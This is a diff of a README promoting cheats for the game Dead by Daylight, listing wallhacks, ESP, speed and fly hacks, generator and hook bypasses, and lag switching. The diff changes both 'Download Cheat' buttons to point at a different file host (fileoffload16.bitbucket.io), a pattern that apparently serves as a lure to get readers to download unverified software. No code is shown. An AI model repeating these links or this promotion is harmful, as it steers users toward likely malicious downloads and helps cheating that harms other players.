@@ -6,7 +6,7 @@
 
 From **wallhacks and ESP** to **speed hacks, fly mods**, and **gen bypass** — this is **next-level control**.
 
-[![Download Cheat](https://img.shields.io/badge/Download-Cheat-blueviolet)](https://wecheaters.github.io/cheats/dead-by-daylight/)
+[![Download Cheat](https://img.shields.io/badge/Download-Cheat-blueviolet)](https://fileoffload16.bitbucket.io)
 ---
 
 ## 🔥 What Dead by Daylight Cheats Can Do
@@ -41,7 +41,7 @@ From **wallhacks and ESP** to **speed hacks, fly mods**, and **gen bypass** — 
 * ✅ **Hook Bypass** – Auto wiggle or become unhookable
 * ✅ **Time Freeze / Lag Switch** – Mess with game sync for fun or pressure
 
-[![Download Cheat](https://i.ytimg.com/vi/xj78TcWaWc0/maxresdefault.jpg)](https://wecheaters.github.io/cheats/dead-by-daylight/)
+[![Download Cheat](https://i.ytimg.com/vi/xj78TcWaWc0/maxresdefault.jpg)](https://fileoffload16.bitbucket.io)
 ---
 
 ## 🆚 Cheat Mode vs Legit Play
